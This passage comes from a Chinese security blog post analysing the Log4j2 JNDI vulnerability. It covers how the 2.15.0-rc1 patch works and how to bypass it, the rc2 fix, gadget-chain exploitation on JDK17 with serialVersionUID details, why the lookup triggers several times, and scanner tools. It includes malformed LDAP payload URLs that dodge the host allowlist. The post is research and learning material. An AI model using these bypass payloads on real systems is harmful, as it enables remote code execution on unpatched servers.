+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.apache.logging.log4j.web.Log4jServletContextListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>log4jServletFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.logging.log4j.web.Log4jServletFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>log4jConfiguration<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>file:///YOUR_LOG4J2.XML_PATH<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>log4jServletFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>REQUEST<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>FORWARD<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>INCLUDE<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>ERROR<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>ASYNC<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765013025589-33980f7b-fc85-452f-9d14-54e27de9b179.png"  alt="img"></p>
+<h1 id="补丁修复-绕过"><a href="#补丁修复-绕过" class="headerlink" title="补丁修复&amp;绕过"></a>补丁修复&amp;绕过</h1><h2 id="2-15-0-rc1"><a href="#2-15-0-rc1" class="headerlink" title="2.15.0-rc1"></a>2.15.0-rc1</h2><p><strong>修复点1</strong>：</p>
+<p>之前MessagePatternConverter#convert是会解析 ${ 的，但是现在默认不会了：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765106715562-d38ad4d9-172e-4c9b-be5d-13ad2a7c6319.png"  alt="img"></p>
+<p>新版本里加了好多子类，默认情况下会走到MessagePatternConverter$SimpleMessagePatternConverter#format，是不会对 ${ 处理的。</p>
+<p>但是子类LookupMessagePatternConverter#format还是保留了对 ${ 的解析：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765106823929-43f7dced-8f82-420d-863c-208615fa2257.png"  alt="img"></p>
+<p>进入replaceIn后，就跟之前一样了。</p>
+<p><strong>修复点2</strong>：</p>
+<p>在JndiManager中也做了修复：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765107139860-e3ed8a68-46da-4a13-82d8-35750a7f360f.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765107158911-f5daf5c9-939e-48e3-934e-365a9d9f8c63.png"  alt="img"></p>
+<p>这里的限制很严格，单独一个allowedHost就很棘手了。</p>
+<p>但是rc1中，捕获异常后不会进行任何操作，所以可以通过人为制造异常来绕过前面的检查，直接进入最下面的lookup。</p>
+<p><strong>绕过思路</strong></p>
+<p>1、</p>
+<p>首先要保证 ${ 能够被解析，这里只能手动改配置文件，所以利用要求比较高，在log4j2.xml中添加%m{lookups}。说实话，添加这个是直接看别的文章的，让我自己想肯定不知道，去官方文档里也没找到。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--输出到控制台--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--时间戳 启用lookups解析，用于在高版本组件中手动开启 线程名 日志级别（INFO/DEBUG 等） Logger 名称，最多显示 36 个字符 日志消息 换行--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; %m&#123;lookups&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--输出到文件 logs/app.log--&gt;</span>  <span class="comment">&lt;!--filePattern：日志滚动时的文件命名规则，例如 logs/app-2025-12-04-1.log.gz--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RollingFile</span> <span class="attr">name</span>=<span class="string">&quot;File&quot;</span> <span class="attr">fileName</span>=<span class="string">&quot;logs/app.log&quot;</span> <span class="attr">filePattern</span>=<span class="string">&quot;logs/app-%d&#123;yyyy-MM-dd&#125;-%i.log.gz&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; %-5level %logger - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">SizeBasedTriggeringPolicy</span> <span class="attr">size</span>=<span class="string">&quot;10MB&quot;</span>/&gt;</span>  <span class="comment">&lt;!--文件超过 10MB 时滚动--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">TimeBasedTriggeringPolicy</span>/&gt;</span>    <span class="comment">&lt;!--按时间滚动（通常是每天）--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">DefaultRolloverStrategy</span> <span class="attr">max</span>=<span class="string">&quot;7&quot;</span>/&gt;</span>  <span class="comment">&lt;!--最多保留 7 个历史文件，超过会删除旧的--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">RollingFile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样到时候就能走到LookupMessagePatternConverter#format</p>
+<p>2、</p>
+<p>制造URISyntaxException报错。这里有很多方法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ldap://127.0.0.1:50389/79fcbc# </span><br><span class="line">ldap://127.0.0.1:50389/79fcbc#^</span><br><span class="line">ldap://127.0.0.1:50389/ 79fcbc</span><br></pre></td></tr></table></figure>
+
+<p>这样不会影响ldap的正常解析，而且能够实现报错。</p>
+<h2 id="2-15-0-rc2修复"><a href="#2-15-0-rc2修复" class="headerlink" title="2.15.0-rc2修复"></a>2.15.0-rc2修复</h2><p>就是在抛出报错部分中 return null：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765108404961-00d1d79a-11c6-416a-8f6c-2cca224e5539.png"  alt="img"></p>
+<h1 id="jdk17利用"><a href="#jdk17利用" class="headerlink" title="jdk17利用"></a>jdk17利用</h1><p>环境：2.14.1版本；jdk17.0.6；</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的根本问题就是，jdk17下，只有springboot依赖，怎么进行原生反序列化利用。</p>
+<p>这里已经有其他师傅讲解过了，可以看：<a class="link"   target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/08/21/%E9%AB%98%E7%89%88%E6%9C%ACjdk%E4%B8%8B%E7%9A%84spring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" >高版本JDK下的Spring原生反序列化链 – fushulingのblog<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里我们直接使用java-chains生成：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765111252951-412f756b-ecac-40e6-8518-c1da5756be40.png"  alt="img"></p>
+<p>这里值得注意的一点是，suid在不同版本会不一样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EventListenerList：jdk8  suid：-5677132037850737084；jdk11/jdk17  suid：-7977902244297240866</span><br><span class="line">DefaultAdvisorChainFactory：spring-aop &lt;=6.0.9/spring-boot-starter-web &lt;= 3.1.0   suid：6115154060221772279；spring-aop &gt;=6.0.10/spring-boot-starter-web &gt;= 3.1.1  suid：273003553246259276</span><br></pre></td></tr></table></figure>
+
+<p>当没有显式声明suid时，可以通过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serialver -classpath &quot;spring-aop-5.3.19.jar&quot; org.springframework.aop.framework.DefaultAdvisorChainFactory</span><br></pre></td></tr></table></figure>
+
+<p>对suid进行查看：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765116102019-41a92c78-a247-494d-adcc-432f2fcfdfe0.png"  alt="img"></p>
+<h1 id="为什么触发了多次"><a href="#为什么触发了多次" class="headerlink" title="为什么触发了多次"></a>为什么触发了多次</h1><p>首先，ldap加载远程字节码触发两次是容易知道的，之前在学jndi的时候跟过调试。一次触发在Class.forName，另一次在newInstance：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765161202574-377000d8-9622-4eed-ba5a-47c168c6ea4f.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765161218423-d3fd1262-05fc-4be2-8279-9884f442a7f1.png"  alt="img"></p>
+<p>接下来往前看，这里还是在getObjectInstance打断点，然后对比两次的调用栈有什么不同：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765161289876-ed7e3726-7765-4a3b-8f1c-8ecd5df2d15b.png"  alt="img"></p>
+<p>看不一样处的前一个调用栈：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765161373658-eaf029d0-f3e9-4e4f-85c3-658db37c579e.png"  alt="img"></p>
+<p>能够知道，大概率是这个appender有两个，再往前分析调用栈，最终在LoggerConfig#callAppenders：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765161539728-f32e13e9-4f6f-4b0a-9ea5-669a8265b792.png"  alt="img"></p>
+<p>这两个分别对应在控制台解析一次，在日志文件里解析一次，和log4j2.xml是对应的。</p>
+<p>于是2*2&#x3D;4，就触发了4次。</p>
+<h1 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h1><p>给几个能够进行漏洞检测的：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/pureqh/Hyacinth" >GitHub - pureqh&#x2F;Hyacinth: 一款java漏洞集合工具<i class="fas fa-external-link-alt"></i></a></p>
+<p>yakit里的插件</p>
+<p>burp里的插件 <a class="link"   target="_blank" rel="noopener" href="https://github.com/f0ng/log4j2burpscanner" >GitHub - f0ng&#x2F;log4j2burpscanner: CVE-2021-44228 Log4j2 BurpSuite Scanner,Customize ceye.io api or other apis,including internal networks<i class="fas fa-external-link-alt"></i></a></p>
+<p>我这里就burp插件成功了，burp插件测试时，需要手动改成非URL编码的才能正常测试请求头中的内容。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1765175841113-2456d9fd-4aa8-4b5f-bf13-21dabcf673ff.png"  alt="img"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>回顾一下一开始的目标，这里学到了：</p>
+<ol>
+<li>漏洞触发条件；payload解析过程；bypass发现过程</li>
+<li>其他的利用方式，包括其他协议，报错利用</li>
+<li>知道了补丁修复及其绕过</li>
+<li>知道了为什么会触发多次</li>
+<li>burp插件被动&#x2F;主动检测log4j2</li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://blog.gm7.org/docs/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/log4j2_rce%E5%88%86%E6%9E%90/#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF" >log4j2_rce分析 | d4m1ts 知识库<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://wjlshare.com/archives/1677" >Log4j2 利用手法学习 – 天下大木头<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://wjlshare.com/archives/1674" >log4j2 RCE 分析 – 天下大木头<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2036012" >浅谈Log4j2信息泄露与不出网回显-腾讯云开发者社区-腾讯云<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://www.bmth666.cn/2025/11/17/%E5%BD%93Log4j%E9%81%87%E5%88%B0jdk17-%E5%BE%80%E6%97%A5%E7%A7%8D%E7%A7%8D%EF%BC%8C%E4%BD%A0%E5%BD%93%E7%9C%9F%E4%B8%8D%E8%AE%B0%E5%BE%97%E4%BA%86%EF%BC%9F/" >当Log4j遇到jdk17~往日种种，你当真不记得了？<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                Log4j2漏洞分析
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/12/08/Log4j2漏洞分析/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-12-08 14:47</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/12/04/Fastjson%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"
+                                   title="Fastjson源码分析"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Fastjson源码分析</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">调试分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">触发条件分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload%E8%A7%A3%E6%9E%90%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">payload解析分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Interpolator-lookup"><span class="nav-number">3.2.1.</span> <span class="nav-text">Interpolator#lookup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#StrSubstitutor-substitute"><span class="nav-number">3.2.2.</span> <span class="nav-text">StrSubstitutor#substitute</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%88%86%E9%9A%94%E7%AC%A6%E5%88%86%E6%9E%90"><span class="nav-number">3.2.3.</span> <span class="nav-text">特殊分隔符分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MessagePatternConverter-format"><span class="nav-number">3.2.4.</span> <span class="nav-text">MessagePatternConverter#format</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="nav-number">4.</span> <span class="nav-text">绕过思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">其他利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sys%EF%BC%8Cenv%EF%BC%8Cjava%E7%AD%89%E5%8D%8F%E8%AE%AE"><span class="nav-number">5.1.</span> <span class="nav-text">sys，env，java等协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bundle%E5%8D%8F%E8%AE%AE"><span class="nav-number">5.2.</span> <span class="nav-text">bundle协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE"><span class="nav-number">5.3.</span> <span class="nav-text">不出网回显</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E4%BF%AE%E5%A4%8D-%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">补丁修复&amp;绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-15-0-rc1"><span class="nav-number">6.1.</span> <span class="nav-text">2.15.0-rc1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-15-0-rc2%E4%BF%AE%E5%A4%8D"><span class="nav-number">6.2.</span> <span class="nav-text">2.15.0-rc2修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jdk17%E5%88%A9%E7%94%A8"><span class="nav-number">7.</span> <span class="nav-text">jdk17利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A7%A6%E5%8F%91%E4%BA%86%E5%A4%9A%E6%AC%A1"><span class="nav-number">8.</span> <span class="nav-text">为什么触发了多次</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8"><span class="nav-number">9.</span> <span class="nav-text">工具利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">11.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">108.4k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">调试分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">触发条件分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload%E8%A7%A3%E6%9E%90%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">payload解析分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Interpolator-lookup"><span class="nav-number">3.2.1.</span> <span class="nav-text">Interpolator#lookup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#StrSubstitutor-substitute"><span class="nav-number">3.2.2.</span> <span class="nav-text">StrSubstitutor#substitute</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%88%86%E9%9A%94%E7%AC%A6%E5%88%86%E6%9E%90"><span class="nav-number">3.2.3.</span> <span class="nav-text">特殊分隔符分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MessagePatternConverter-format"><span class="nav-number">3.2.4.</span> <span class="nav-text">MessagePatternConverter#format</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="nav-number">4.</span> <span class="nav-text">绕过思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span 